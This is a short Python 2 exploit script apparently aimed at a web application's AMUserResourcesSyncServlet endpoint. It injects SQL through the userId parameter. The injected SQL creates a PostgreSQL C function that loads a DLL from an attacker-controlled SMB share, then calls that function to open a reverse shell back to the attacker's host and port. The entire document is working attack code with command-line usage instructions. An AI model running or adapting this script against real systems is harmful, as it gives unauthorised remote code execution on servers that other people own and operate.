import requests, sys
requests.packages.urllib3.disable_warnings()

def log(msg):
   print msg

def make_request(url, sql):
   log("[*] Executing query: %s" % sql[0:180])
   r = requests.get( url % sql, verify=False)
   return r

def create_udf_func(url):
   log("[+] Creating function...")
   # Modify the attacker SMB IP address and sharename if required.
   sql = 'CREATE OR REPLACE FUNCTION rev_shell(text, integer) RETURNS void AS $$\\\\192.168.45.211\\test\\udf_rev_shell.dll$$,$$connect_back$$ LANGUAGE C STRICT'
   make_request(url, sql)

def trigger_udf(url, ip, port):
   log("[+] Launching reverse shell...")
   sql = "select rev_shell($$%s$$, %d)" % (ip, int(port))
   make_request(url, sql)
    
if __name__ == '__main__':
   try:
       server = sys.argv[1].strip()
       attacker = sys.argv[2].strip()
       port = sys.argv[3].strip()
   except IndexError:
       print "[-] Usage: %s https://<IP>:<PORT> <LHOST> <LPORT>" % sys.argv[0]
       sys.exit()
       
   sqli_url  = server+"/servlet/AMUserResourcesSyncServlet?ForMasRange=1&userId=1;%s;--" 
   create_udf_func(sqli_url)
   trigger_udf(sqli_url, attacker, port)

